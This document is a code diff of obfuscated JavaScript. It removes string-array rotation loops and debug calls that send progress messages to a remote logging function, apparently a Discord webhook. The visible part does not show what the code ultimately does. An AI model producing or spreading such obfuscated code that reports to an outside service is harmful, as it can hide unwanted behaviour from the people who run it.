@@ -10,60 +10,7 @@ function logToDiscord(message) {
     }).catch(error => console.error("Error sending log to Discord:", error));
 }
 
-// Example of logging initialization points
-logToDiscord("Nothing happened yet");
-(function (_0x2e34e0, _0x2727bf) {
-    logToDiscord("Initialization started"); // Log start of initialization
-    const _0x1a88d5 = _0x2e34e0();
-    while (true) {
-        try {
-            logToDiscord("Entering main loop"); // Log entering main loop
-            const _0x3e6fd3 = parseInt(_0x40d9(6240, 0x176c)) / 1 + 
-                parseInt(_0x40d9(7930, 0xcf9)) / 2 + 
-                -parseInt(_0x40d9(9739, 0x1262)) / 3 + 
-                parseInt(_0x40d9(8556, 0x2901)) / 4 + 
-                parseInt(_0x40d9(4251, -0x2a1)) / 5 + 
-                parseInt(_0x40d9(2129, 0x8ef)) / 6 + 
-                -parseInt(_0x40d9(1082, 0x629)) / 7;
-
-            if (_0x3e6fd3 === _0x2727bf) {
-                logToDiscord("Initialization successful"); // Log success
-                break;
-            } else {
-                logToDiscord("Shifting array due to mismatch"); // Log shift action
-                _0x1a88d5.push(_0x1a88d5.shift());
-            }
-        } catch (_0xe6ad79) {
-            logToDiscord("Error encountered: " + _0xe6ad79.message); // Log errors
-            _0x1a88d5.push(_0x1a88d5.shift());
-        }
-    }
-})(_0x4292, 493538);
-(function (_0x52a9ca, _0x595e4e) {
-  logToDiscord("1");
-  const _0x28bfb2 = _0x52a9ca();
-  while (true) {
-    try {
-      const _0x1bc482 =
-        -parseInt(_0x7c1d(4686, "LQaP")) / 1 +
-        -parseInt(_0x7c1d(5181, "VBFa")) / 2 +
-        (-parseInt(_0x7c1d(5498, "I2O0")) / 3) * (parseInt(_0x7c1d(3731, "WG&*")) / 4) +
-        (-parseInt(_0x7c1d(4172, "(6[r")) / 5) * (-parseInt(_0x7c1d(1344, "lJx&")) / 6) +
-        parseInt(_0x7c1d(5410, "z*Ff")) / 7 +
-        (parseInt(_0x7c1d(4000, "HvHR")) / 8) * (-parseInt(_0x7c1d(2548, "J[gw")) / 9) +
-        parseInt(_0x7c1d(5853, "g@EB")) / 10;
-      if (_0x1bc482 === _0x595e4e) {
-        break;
-      } else {
-        _0x28bfb2.push(_0x28bfb2.shift());
-      }
-    } catch (_0x3339f2) {
-      _0x28bfb2.push(_0x28bfb2.shift());
-    }
-  }
-})(_0x3155, 231864);
 const _0x4fa6f1 = (function () {
-  logToDiscord("2");
   const _0x1fb5ef = (function () {
     let _0x5ae1c8 = true;
     return function (_0x36f503, _0x2a2f9b) {
@@ -140,7 +87,6 @@ const _0x5183c3 = _0x4fa6f1(this, function () {
 });
 _0x5183c3();
 (function () {
-  logToDiscord("3");
   const _0x4bc7e2 = (function () {
     let _0x49e6c6 = true;
     return function (_0x540155, _0x4aefde) {
